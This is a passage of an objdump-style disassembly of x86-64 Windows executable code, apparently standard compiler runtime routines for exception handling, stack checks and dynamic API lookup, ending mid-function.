   140002556:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000255d:	00 00 00 
   140002560:	cc                   	int3
   140002561:	cc                   	int3
   140002562:	cc                   	int3
   140002563:	cc                   	int3
   140002564:	cc                   	int3
   140002565:	cc                   	int3
   140002566:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000256d:	00 00 00 
   140002570:	cc                   	int3
   140002571:	cc                   	int3
   140002572:	cc                   	int3
   140002573:	cc                   	int3
   140002574:	cc                   	int3
   140002575:	cc                   	int3
   140002576:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000257d:	00 00 00 
   140002580:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002585:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   14000258a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   14000258f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140002596:	e9 05 00 00 00       	jmp    0x1400025a0
   14000259b:	cc                   	int3
   14000259c:	cc                   	int3
   14000259d:	cc                   	int3
   14000259e:	cc                   	int3
   14000259f:	cc                   	int3
   1400025a0:	c3                   	ret
   1400025a1:	cc                   	int3
   1400025a2:	cc                   	int3
   1400025a3:	cc                   	int3
   1400025a4:	cc                   	int3
   1400025a5:	cc                   	int3
   1400025a6:	cc                   	int3
   1400025a7:	cc                   	int3
   1400025a8:	cc                   	int3
   1400025a9:	cc                   	int3
   1400025aa:	cc                   	int3
   1400025ab:	cc                   	int3
   1400025ac:	cc                   	int3
   1400025ad:	cc                   	int3
   1400025ae:	cc                   	int3
   1400025af:	cc                   	int3
   1400025b0:	c3                   	ret
   1400025b1:	cc                   	int3
   1400025b2:	cc                   	int3
   1400025b3:	cc                   	int3
   1400025b4:	48 8b 05 ed dc 00 00 	mov    0xdced(%rip),%rax        # 0x1400102a8
   1400025bb:	48 8d 15 e6 f5 ff ff 	lea    -0xa1a(%rip),%rdx        # 0x140001ba8
   1400025c2:	48 3b c2             	cmp    %rdx,%rax
   1400025c5:	74 23                	je     0x1400025ea
   1400025c7:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400025ce:	00 00 
   1400025d0:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   1400025d7:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   1400025db:	72 06                	jb     0x1400025e3
   1400025dd:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   1400025e1:	76 07                	jbe    0x1400025ea
   1400025e3:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400025e8:	cd 29                	int    $0x29
   1400025ea:	c3                   	ret
   1400025eb:	cc                   	int3
   1400025ec:	48 83 ec 28          	sub    $0x28,%rsp
   1400025f0:	48 85 c9             	test   %rcx,%rcx
   1400025f3:	74 11                	je     0x140002606
   1400025f5:	48 8d 05 a4 8a 01 00 	lea    0x18aa4(%rip),%rax        # 0x14001b0a0
   1400025fc:	48 3b c8             	cmp    %rax,%rcx
   1400025ff:	74 05                	je     0x140002606
   140002601:	e8 8e 37 00 00       	call   0x140005d94
   140002606:	48 83 c4 28          	add    $0x28,%rsp
   14000260a:	c3                   	ret
   14000260b:	cc                   	int3
   14000260c:	48 83 ec 28          	sub    $0x28,%rsp
   140002610:	e8 13 00 00 00       	call   0x140002628
   140002615:	48 85 c0             	test   %rax,%rax
   140002618:	74 05                	je     0x14000261f
   14000261a:	48 83 c4 28          	add    $0x28,%rsp
   14000261e:	c3                   	ret
   14000261f:	e8 ec 37 00 00       	call   0x140005e10
   140002624:	cc                   	int3
   140002625:	cc                   	int3
   140002626:	cc                   	int3
   140002627:	cc                   	int3
   140002628:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000262d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002632:	57                   	push   %rdi
   140002633:	48 83 ec 20          	sub    $0x20,%rsp
   140002637:	83 3d 32 7a 01 00 ff 	cmpl   $0xffffffff,0x17a32(%rip)        # 0x14001a070
   14000263e:	75 07                	jne    0x140002647
   140002640:	33 c0                	xor    %eax,%eax
   140002642:	e9 90 00 00 00       	jmp    0x1400026d7
   140002647:	ff 15 8b da 00 00    	call   *0xda8b(%rip)        # 0x1400100d8
   14000264d:	8b 0d 1d 7a 01 00    	mov    0x17a1d(%rip),%ecx        # 0x14001a070
   140002653:	8b f8                	mov    %eax,%edi
   140002655:	e8 5a 03 00 00       	call   0x1400029b4
   14000265a:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000265e:	33 f6                	xor    %esi,%esi
   140002660:	48 3b c2             	cmp    %rdx,%rax
   140002663:	74 67                	je     0x1400026cc
   140002665:	48 85 c0             	test   %rax,%rax
   140002668:	74 05                	je     0x14000266f
   14000266a:	48 8b f0             	mov    %rax,%rsi
   14000266d:	eb 5d                	jmp    0x1400026cc
   14000266f:	8b 0d fb 79 01 00    	mov    0x179fb(%rip),%ecx        # 0x14001a070
   140002675:	e8 82 03 00 00       	call   0x1400029fc
   14000267a:	85 c0                	test   %eax,%eax
   14000267c:	74 4e                	je     0x1400026cc
   14000267e:	ba 80 00 00 00       	mov    $0x80,%edx
   140002683:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140002686:	e8 dd 37 00 00       	call   0x140005e68
   14000268b:	8b 0d df 79 01 00    	mov    0x179df(%rip),%ecx        # 0x14001a070
   140002691:	48 8b d8             	mov    %rax,%rbx
   140002694:	48 85 c0             	test   %rax,%rax
   140002697:	74 24                	je     0x1400026bd
   140002699:	48 8b d0             	mov    %rax,%rdx
   14000269c:	e8 5b 03 00 00       	call   0x1400029fc
   1400026a1:	85 c0                	test   %eax,%eax
   1400026a3:	74 12                	je     0x1400026b7
   1400026a5:	48 8b c3             	mov    %rbx,%rax
   1400026a8:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   1400026af:	48 8b de             	mov    %rsi,%rbx
   1400026b2:	48 8b f0             	mov    %rax,%rsi
   1400026b5:	eb 0d                	jmp    0x1400026c4
   1400026b7:	8b 0d b3 79 01 00    	mov    0x179b3(%rip),%ecx        # 0x14001a070
   1400026bd:	33 d2                	xor    %edx,%edx
   1400026bf:	e8 38 03 00 00       	call   0x1400029fc
   1400026c4:	48 8b cb             	mov    %rbx,%rcx
   1400026c7:	e8 c8 36 00 00       	call   0x140005d94
   1400026cc:	8b cf                	mov    %edi,%ecx
   1400026ce:	ff 15 0c da 00 00    	call   *0xda0c(%rip)        # 0x1400100e0
   1400026d4:	48 8b c6             	mov    %rsi,%rax
   1400026d7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400026dc:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400026e1:	48 83 c4 20          	add    $0x20,%rsp
   1400026e5:	5f                   	pop    %rdi
   1400026e6:	c3                   	ret
   1400026e7:	cc                   	int3
   1400026e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400026ec:	48 8d 0d f9 fe ff ff 	lea    -0x107(%rip),%rcx        # 0x1400025ec
   1400026f3:	e8 2c 02 00 00       	call   0x140002924
   1400026f8:	89 05 72 79 01 00    	mov    %eax,0x17972(%rip)        # 0x14001a070
   1400026fe:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002701:	74 25                	je     0x140002728
   140002703:	48 8d 15 96 89 01 00 	lea    0x18996(%rip),%rdx        # 0x14001b0a0
   14000270a:	8b c8                	mov    %eax,%ecx
   14000270c:	e8 eb 02 00 00       	call   0x1400029fc
   140002711:	85 c0                	test   %eax,%eax
   140002713:	74 0e                	je     0x140002723
   140002715:	c7 05 f9 89 01 00 fe 	movl   $0xfffffffe,0x189f9(%rip)        # 0x14001b118
   14000271c:	ff ff ff 
   14000271f:	b0 01                	mov    $0x1,%al
   140002721:	eb 07                	jmp    0x14000272a
   140002723:	e8 08 00 00 00       	call   0x140002730
   140002728:	32 c0                	xor    %al,%al
   14000272a:	48 83 c4 28          	add    $0x28,%rsp
   14000272e:	c3                   	ret
   14000272f:	cc                   	int3
   140002730:	48 83 ec 28          	sub    $0x28,%rsp
   140002734:	8b 0d 36 79 01 00    	mov    0x17936(%rip),%ecx        # 0x14001a070
   14000273a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   14000273d:	74 0c                	je     0x14000274b
   14000273f:	e8 28 02 00 00       	call   0x14000296c
   140002744:	83 0d 25 79 01 00 ff 	orl    $0xffffffff,0x17925(%rip)        # 0x14001a070
   14000274b:	b0 01                	mov    $0x1,%al
   14000274d:	48 83 c4 28          	add    $0x28,%rsp
   140002751:	c3                   	ret
   140002752:	cc                   	int3
   140002753:	cc                   	int3
   140002754:	40 53                	rex push %rbx
   140002756:	48 83 ec 20          	sub    $0x20,%rsp
   14000275a:	33 db                	xor    %ebx,%ebx
   14000275c:	48 8d 15 bd 89 01 00 	lea    0x189bd(%rip),%rdx        # 0x14001b120
   140002763:	45 33 c0             	xor    %r8d,%r8d
   140002766:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   14000276a:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   14000276e:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140002773:	e8 d8 02 00 00       	call   0x140002a50
   140002778:	85 c0                	test   %eax,%eax
   14000277a:	74 11                	je     0x14000278d
   14000277c:	ff 05 c6 89 01 00    	incl   0x189c6(%rip)        # 0x14001b148
   140002782:	ff c3                	inc    %ebx
   140002784:	83 fb 01             	cmp    $0x1,%ebx
   140002787:	72 d3                	jb     0x14000275c
   140002789:	b0 01                	mov    $0x1,%al
   14000278b:	eb 07                	jmp    0x140002794
   14000278d:	e8 0a 00 00 00       	call   0x14000279c
   140002792:	32 c0                	xor    %al,%al
   140002794:	48 83 c4 20          	add    $0x20,%rsp
   140002798:	5b                   	pop    %rbx
   140002799:	c3                   	ret
   14000279a:	cc                   	int3
   14000279b:	cc                   	int3
   14000279c:	40 53                	rex push %rbx
   14000279e:	48 83 ec 20          	sub    $0x20,%rsp
   1400027a2:	8b 1d a0 89 01 00    	mov    0x189a0(%rip),%ebx        # 0x14001b148
   1400027a8:	eb 1d                	jmp    0x1400027c7
   1400027aa:	48 8d 05 6f 89 01 00 	lea    0x1896f(%rip),%rax        # 0x14001b120
   1400027b1:	ff cb                	dec    %ebx
   1400027b3:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1400027b7:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400027bb:	ff 15 37 d9 00 00    	call   *0xd937(%rip)        # 0x1400100f8
   1400027c1:	ff 0d 81 89 01 00    	decl   0x18981(%rip)        # 0x14001b148
   1400027c7:	85 db                	test   %ebx,%ebx
   1400027c9:	75 df                	jne    0x1400027aa
   1400027cb:	b0 01                	mov    $0x1,%al
   1400027cd:	48 83 c4 20          	add    $0x20,%rsp
   1400027d1:	5b                   	pop    %rbx
   1400027d2:	c3                   	ret
   1400027d3:	cc                   	int3
   1400027d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400027d9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400027de:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400027e3:	57                   	push   %rdi
   1400027e4:	41 54                	push   %r12
   1400027e6:	41 55                	push   %r13
   1400027e8:	41 56                	push   %r14
   1400027ea:	41 57                	push   %r15
   1400027ec:	48 83 ec 20          	sub    $0x20,%rsp
   1400027f0:	8b f9                	mov    %ecx,%edi
   1400027f2:	4c 8d 3d 07 d8 ff ff 	lea    -0x27f9(%rip),%r15        # 0x140000000
   1400027f9:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   1400027fd:	4d 8b e1             	mov    %r9,%r12
   140002800:	49 8b e8             	mov    %r8,%rbp
   140002803:	4c 8b ea             	mov    %rdx,%r13
   140002806:	49 8b 84 ff d0 b1 01 	mov    0x1b1d0(%r15,%rdi,8),%rax
   14000280d:	00 
   14000280e:	90                   	nop
   14000280f:	49 3b c6             	cmp    %r14,%rax
   140002812:	0f 84 ae 00 00 00    	je     0x1400028c6
   140002818:	48 85 c0             	test   %rax,%rax
   14000281b:	0f 85 a7 00 00 00    	jne    0x1400028c8
   140002821:	4d 3b c1             	cmp    %r9,%r8
   140002824:	0f 84 94 00 00 00    	je     0x1400028be
   14000282a:	8b 75 00             	mov    0x0(%rbp),%esi
   14000282d:	49 8b 9c f7 b8 b1 01 	mov    0x1b1b8(%r15,%rsi,8),%rbx
   140002834:	00 
   140002835:	90                   	nop
   140002836:	48 85 db             	test   %rbx,%rbx
   140002839:	74 0b                	je     0x140002846
   14000283b:	49 3b de             	cmp    %r14,%rbx
   14000283e:	0f 85 c1 00 00 00    	jne    0x140002905
   140002844:	eb 6b                	jmp    0x1400028b1
   140002846:	4d 8b bc f7 78 11 01 	mov    0x11178(%r15,%rsi,8),%r15
   14000284d:	00 
   14000284e:	33 d2                	xor    %edx,%edx
   140002850:	49 8b cf             	mov    %r15,%rcx
   140002853:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140002859:	ff 15 d9 d8 00 00    	call   *0xd8d9(%rip)        # 0x140010138
   14000285f:	48 8b d8             	mov    %rax,%rbx
   140002862:	48 85 c0             	test   %rax,%rax
   140002865:	75 7e                	jne    0x1400028e5
   140002867:	ff 15 6b d8 00 00    	call   *0xd86b(%rip)        # 0x1400100d8
   14000286d:	83 f8 57             	cmp    $0x57,%eax
   140002870:	75 2d                	jne    0x14000289f
   140002872:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140002876:	49 8b cf             	mov    %r15,%rcx
   140002879:	48 8d 15 a8 e9 00 00 	lea    0xe9a8(%rip),%rdx        # 0x140011228
   140002880:	e8 6b 37 00 00       	call   0x140005ff0
   140002885:	85 c0                	test   %eax,%eax
   140002887:	74 16                	je     0x14000289f
   140002889:	45 33 c0             	xor    %r8d,%r8d
   14000288c:	33 d2                	xor    %edx,%edx
   14000288e:	49 8b cf             	mov    %r15,%rcx
   140002891:	ff 15 a1 d8 00 00    	call   *0xd8a1(%rip)        # 0x140010138
   140002897:	48 8b d8             	mov    %rax,%rbx
   14000289a:	48 85 c0             	test   %rax,%rax
   14000289d:	75 46                	jne    0x1400028e5
   14000289f:	49 8b c6             	mov    %r14,%rax
   1400028a2:	4c 8d 3d 57 d7 ff ff 	lea    -0x28a9(%rip),%r15        # 0x140000000
   1400028a9:	49 87 84 f7 b8 b1 01 	xchg   %rax,0x1b1b8(%r15,%rsi,8)
   1400028b0:	00 
   1400028b1:	48 83 c5 04          	add    $0x4,%rbp
   1400028b5:	49 3b ec             	cmp    %r12,%rbp
   1400028b8:	0f 85 6c ff ff ff    	jne    0x14000282a
   1400028be:	4d 87 b4 ff d0 b1 01 	xchg   %r14,0x1b1d0(%r15,%rdi,8)
   1400028c5:	00 
   1400028c6:	33 c0                	xor    %eax,%eax
   1400028c8:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400028cd:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400028d2:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400028d7:	48 83 c4 20          	add    $0x20,%rsp
   1400028db:	41 5f                	pop    %r15
   1400028dd:	41 5e                	pop    %r14
   1400028df:	41 5d                	pop    %r13
   1400028e1:	41 5c                	pop    %r12
   1400028e3:	5f                   	pop    %rdi
   1400028e4:	c3                   	ret
   1400028e5:	48 8b c3             	mov    %rbx,%rax
   1400028e8:	4c 8d 3d 11 d7 ff ff 	lea    -0x28ef(%rip),%r15        # 0x140000000
   1400028ef:	49 87 84 f7 b8 b1 01 	xchg   %rax,0x1b1b8(%r15,%rsi,8)
   1400028f6:	00 
   1400028f7:	48 85 c0             	test   %rax,%rax
   1400028fa:	74 09                	je     0x140002905
   1400028fc:	48 8b cb             	mov    %rbx,%rcx
   1400028ff:	ff 15 23 d8 00 00    	call   *0xd823(%rip)        # 0x140010128
   140002905:	49 8b d5             	mov    %r13,%rdx
   140002908:	48 8b cb             	mov    %rbx,%rcx
   14000290b:	ff 15 1f d8 00 00    	call   *0xd81f(%rip)        # 0x140010130
   140002911:	48 85 c0             	test   %rax,%rax
   140002914:	74 a8                	je     0x1400028be
   140002916:	48 8b c8             	mov    %rax,%rcx
   140002919:	49 87 8c ff d0 b1 01 	xchg   %rcx,0x1b1d0(%r15,%rdi,8)
   140002920:	00 
   140002921:	eb a5                	jmp    0x1400028c8
   140002923:	cc                   	int3
   140002924:	40 53                	rex push %rbx
   140002926:	48 83 ec 20          	sub    $0x20,%rsp
   14000292a:	48 8b d9             	mov    %rcx,%rbx
   14000292d:	4c 8d 0d 0c e9 00 00 	lea    0xe90c(%rip),%r9        # 0x140011240
   140002934:	33 c9                	xor    %ecx,%ecx
   140002936:	4c 8d 05 fb e8 00 00 	lea    0xe8fb(%rip),%r8        # 0x140011238
   14000293d:	48 8d 15 fc e8 00 00 	lea    0xe8fc(%rip),%rdx        # 0x140011240
   140002944:	e8 8b fe ff ff       	call   0x1400027d4
   140002949:	48 85 c0             	test   %rax,%rax
   14000294c:	74 0f                	je     0x14000295d
   14000294e:	48 8b cb             	mov    %rbx,%rcx
   140002951:	48 83 c4 20          	add    $0x20,%rsp
   140002955:	5b                   	pop    %rbx
   140002956:	48 ff 25 5b d9 00 00 	rex.W jmp *0xd95b(%rip)        # 0x1400102b8
   14000295d:	48 83 c4 20          	add    $0x20,%rsp
   140002961:	5b                   	pop    %rbx
   140002962:	48 ff 25 9f d7 00 00 	rex.W jmp *0xd79f(%rip)        # 0x140010108
   140002969:	cc                   	int3
   14000296a:	cc                   	int3
   14000296b:	cc                   	int3
   14000296c:	40 53                	rex push %rbx
   14000296e:	48 83 ec 20          	sub    $0x20,%rsp
   140002972:	8b d9                	mov    %ecx,%ebx
   140002974:	4c 8d 0d dd e8 00 00 	lea    0xe8dd(%rip),%r9        # 0x140011258
   14000297b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002980:	4c 8d 05 c9 e8 00 00 	lea    0xe8c9(%rip),%r8        # 0x140011250
   140002987:	48 8d 15 ca e8 00 00 	lea    0xe8ca(%rip),%rdx        # 0x140011258
   14000298e:	e8 41 fe ff ff       	call   0x1400027d4
   140002993:	8b cb                	mov    %ebx,%ecx
   140002995:	48 85 c0             	test   %rax,%rax
   140002998:	74 0c                	je     0x1400029a6
   14000299a:	48 83 c4 20          	add    $0x20,%rsp
   14000299e:	5b                   	pop    %rbx
   14000299f:	48 ff 25 12 d9 00 00 	rex.W jmp *0xd912(%rip)        # 0x1400102b8
   1400029a6:	48 83 c4 20          	add    $0x20,%rsp
   1400029aa:	5b                   	pop    %rbx
   1400029ab:	48 ff 25 6e d7 00 00 	rex.W jmp *0xd76e(%rip)        # 0x140010120
   1400029b2:	cc                   	int3
   1400029b3:	cc                   	int3
   1400029b4:	40 53                	rex push %rbx
   1400029b6:	48 83 ec 20          	sub    $0x20,%rsp
   1400029ba:	8b d9                	mov    %ecx,%ebx
   1400029bc:	4c 8d 0d a5 e8 00 00 	lea    0xe8a5(%rip),%r9        # 0x140011268
   1400029c3:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400029c8:	4c 8d 05 91 e8 00 00 	lea    0xe891(%rip),%r8        # 0x140011260
   1400029cf:	48 8d 15 92 e8 00 00 	lea    0xe892(%rip),%rdx        # 0x140011268
   1400029d6:	e8 f9 fd ff ff       	call   0x1400027d4
   1400029db:	8b cb                	mov    %ebx,%ecx
   1400029dd:	48 85 c0             	test   %rax,%rax
   1400029e0:	74 0c                	je     0x1400029ee
   1400029e2:	48 83 c4 20          	add    $0x20,%rsp
   1400029e6:	5b                   	pop    %rbx
   1400029e7:	48 ff 25 ca d8 00 00 	rex.W jmp *0xd8ca(%rip)        # 0x1400102b8
   1400029ee:	48 83 c4 20          	add    $0x20,%rsp
   1400029f2:	5b                   	pop    %rbx
   1400029f3:	48 ff 25 16 d7 00 00 	rex.W jmp *0xd716(%rip)        # 0x140010110
   1400029fa:	cc                   	int3
   1400029fb:	cc                   	int3
   1400029fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002a01:	57                   	push   %rdi
   140002a02:	48 83 ec 20          	sub    $0x20,%rsp
   140002a06:	48 8b da             	mov    %rdx,%rbx
   140002a09:	4c 8d 0d 70 e8 00 00 	lea    0xe870(%rip),%r9        # 0x140011280
   140002a10:	8b f9                	mov    %ecx,%edi
   140002a12:	48 8d 15 67 e8 00 00 	lea    0xe867(%rip),%rdx        # 0x140011280
   140002a19:	b9 03 00 00 00       	mov    $0x3,%ecx
   140002a1e:	4c 8d 05 53 e8 00 00 	lea    0xe853(%rip),%r8        # 0x140011278
   140002a25:	e8 aa fd ff ff       	call   0x1400027d4
   140002a2a:	48 8b d3             	mov    %rbx,%rdx
   140002a2d:	8b cf                	mov    %edi,%ecx
   140002a2f:	48 85 c0             	test   %rax,%rax
   140002a32:	74 08                	je     0x140002a3c
   140002a34:	ff 15 7e d8 00 00    	call   *0xd87e(%rip)        # 0x1400102b8
   140002a3a:	eb 06                	jmp    0x140002a42
   140002a3c:	ff 15 d6 d6 00 00    	call   *0xd6d6(%rip)        # 0x140010118
   140002a42:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002a47:	48 83 c4 20          	add    $0x20,%rsp
   140002a4b:	5f                   	pop    %rdi
   140002a4c:	c3                   	ret
   140002a4d:	cc                   	int3
   140002a4e:	cc                   	int3
   140002a4f:	cc                   	int3
   140002a50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002a55:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002a5a:	57                   	push   %rdi
   140002a5b:	48 83 ec 20          	sub    $0x20,%rsp
   140002a5f:	41 8b f0             	mov    %r8d,%esi
   140002a62:	4c 8d 0d 2f e8 00 00 	lea    0xe82f(%rip),%r9        # 0x140011298
   140002a69:	8b da                	mov    %edx,%ebx
   140002a6b:	4c 8d 05 1e e8 00 00 	lea    0xe81e(%rip),%r8        # 0x140011290
   140002a72:	48 8b f9             	mov    %rcx,%rdi
   140002a75:	48 8d 15 1c e8 00 00 	lea    0xe81c(%rip),%rdx        # 0x140011298
   140002a7c:	b9 04 00 00 00       	mov    $0x4,%ecx
   140002a81:	e8 4e fd ff ff       	call   0x1400027d4
   140002a86:	8b d3                	mov    %ebx,%edx
   140002a88:	48 8b cf             	mov    %rdi,%rcx
   140002a8b:	48 85 c0             	test   %rax,%rax
   140002a8e:	74 0b                	je     0x140002a9b
   140002a90:	44 8b c6             	mov    %esi,%r8d
   140002a93:	ff 15 1f d8 00 00    	call   *0xd81f(%rip)        # 0x1400102b8
   140002a99:	eb 06                	jmp    0x140002aa1
   140002a9b:	ff 15 5f d6 00 00    	call   *0xd65f(%rip)        # 0x140010100
   140002aa1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002aa6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002aab:	48 83 c4 20          	add    $0x20,%rsp
   140002aaf:	5f                   	pop    %rdi
   140002ab0:	c3                   	ret
   140002ab1:	cc                   	int3
   140002ab2:	cc                   	int3
   140002ab3:	cc                   	int3
   140002ab4:	48 8b c4             	mov    %rsp,%rax
   140002ab7:	4c 89 48 20          	mov    %r9,0x20(%rax)
   140002abb:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140002abf:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140002ac3:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140002ac7:	53                   	push   %rbx
   140002ac8:	48 83 ec 70          	sub    $0x70,%rsp
   140002acc:	48 8b d9             	mov    %rcx,%rbx
   140002acf:	83 60 c8 00          	andl   $0x0,-0x38(%rax)
   140002ad3:	48 89 48 e0          	mov    %rcx,-0x20(%rax)
   140002ad7:	4c 89 40 e8          	mov    %r8,-0x18(%rax)
   140002adb:	e8 2c fb ff ff       	call   0x14000260c
   140002ae0:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140002ae5:	8b 0b                	mov    (%rbx),%ecx
   140002ae7:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002aeb:	ff 15 c7 d7 00 00    	call   *0xd7c7(%rip)        # 0x1400102b8
   140002af1:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   140002af8:	00 
   140002af9:	eb 00                	jmp    0x140002afb
   140002afb:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140002aff:	48 83 c4 70          	add    $0x70,%rsp
   140002b03:	5b                   	pop    %rbx
   140002b04:	c3                   	ret
   140002b05:	cc                   	int3
   140002b06:	cc                   	int3
   140002b07:	cc                   	int3
   140002b08:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002b0d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002b12:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002b17:	57                   	push   %rdi
   140002b18:	48 83 ec 20          	sub    $0x20,%rsp
   140002b1c:	8b 79 0c             	mov    0xc(%rcx),%edi
   140002b1f:	8b f2                	mov    %edx,%esi
   140002b21:	48 8b e9             	mov    %rcx,%rbp
   140002b24:	85 ff                	test   %edi,%edi
   140002b26:	74 2b                	je     0x140002b53
   140002b28:	8d 5f ff             	lea    -0x1(%rdi),%ebx
   140002b2b:	8b fb                	mov    %ebx,%edi
   140002b2d:	e8 da fa ff ff       	call   0x14000260c
   140002b32:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   140002b36:	48 8b 40 60          	mov    0x60(%rax),%rax
   140002b3a:	48 8d 0c 90          	lea    (%rax,%rdx,4),%rcx
   140002b3e:	48 63 45 10          	movslq 0x10(%rbp),%rax
   140002b42:	48 03 c1             	add    %rcx,%rax
   140002b45:	3b 70 04             	cmp    0x4(%rax),%esi
   140002b48:	7e 05                	jle    0x140002b4f
   140002b4a:	3b 70 08             	cmp    0x8(%rax),%esi
   140002b4d:	7e 06                	jle    0x140002b55
   140002b4f:	85 db                	test   %ebx,%ebx
   140002b51:	75 d5                	jne    0x140002b28
   140002b53:	33 c0                	xor    %eax,%eax
   140002b55:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002b5a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002b5f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002b64:	48 83 c4 20          	add    $0x20,%rsp
   140002b68:	5f                   	pop    %rdi
   140002b69:	c3                   	ret
   140002b6a:	cc                   	int3
   140002b6b:	cc                   	int3
   140002b6c:	40 53                	rex push %rbx
   140002b6e:	48 83 ec 20          	sub    $0x20,%rsp
   140002b72:	48 8b da             	mov    %rdx,%rbx
   140002b75:	48 8b d1             	mov    %rcx,%rdx
   140002b78:	48 8b cb             	mov    %rbx,%rcx
   140002b7b:	e8 9c 05 00 00       	call   0x14000311c
   140002b80:	8b d0                	mov    %eax,%edx
   140002b82:	48 8b cb             	mov    %rbx,%rcx
   140002b85:	e8 7e ff ff ff       	call   0x140002b08
   140002b8a:	48 85 c0             	test   %rax,%rax
   140002b8d:	0f 95 c0             	setne  %al
   140002b90:	48 83 c4 20          	add    $0x20,%rsp
   140002b94:	5b                   	pop    %rbx
   140002b95:	c3                   	ret
   140002b96:	cc                   	int3
   140002b97:	cc                   	int3
   140002b98:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002b9d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002ba2:	57                   	push   %rdi
   140002ba3:	48 83 ec 20          	sub    $0x20,%rsp
   140002ba7:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140002bac:	49 8b d8             	mov    %r8,%rbx
   140002baf:	48 8b fa             	mov    %rdx,%rdi
   140002bb2:	e8 45 00 00 00       	call   0x140002bfc
   140002bb7:	48 8b d7             	mov    %rdi,%rdx
   140002bba:	48 8b cb             	mov    %rbx,%rcx
   140002bbd:	48 8b f0             	mov    %rax,%rsi
   140002bc0:	e8 57 05 00 00       	call   0x14000311c
   140002bc5:	8b d0                	mov    %eax,%edx
   140002bc7:	48 8b cb             	mov    %rbx,%rcx
   140002bca:	e8 39 ff ff ff       	call   0x140002b08
   140002bcf:	48 85 c0             	test   %rax,%rax
   140002bd2:	75 06                	jne    0x140002bda
   140002bd4:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140002bd8:	eb 04                	jmp    0x140002bde
   140002bda:	44 8b 48 04          	mov    0x4(%rax),%r9d
   140002bde:	4c 8b c3             	mov    %rbx,%r8
   140002be1:	48 8b d7             	mov    %rdi,%rdx
   140002be4:	48 8b ce             	mov    %rsi,%rcx
   140002be7:	e8 4c 17 00 00       	call   0x140004338
   140002bec:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002bf1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002bf6:	48 83 c4 20          	add    $0x20,%rsp
   140002bfa:	5f                   	pop    %rdi
   140002bfb:	c3                   	ret
   140002bfc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002c01:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140002c06:	56                   	push   %rsi
   140002c07:	57                   	push   %rdi
   140002c08:	41 54                	push   %r12
   140002c0a:	41 56                	push   %r14
   140002c0c:	41 57                	push   %r15
   140002c0e:	48 83 ec 20          	sub    $0x20,%rsp
   140002c12:	41 8b 70 0c          	mov    0xc(%r8),%esi
   140002c16:	4c 8b e1             	mov    %rcx,%r12
   140002c19:	49 8b c8             	mov    %r8,%rcx
   140002c1c:	49 8b f9             	mov    %r9,%rdi
   140002c1f:	4d 8b f0             	mov    %r8,%r14
   140002c22:	4c 8b fa             	mov    %rdx,%r15
   140002c25:	e8 f2 04 00 00       	call   0x14000311c
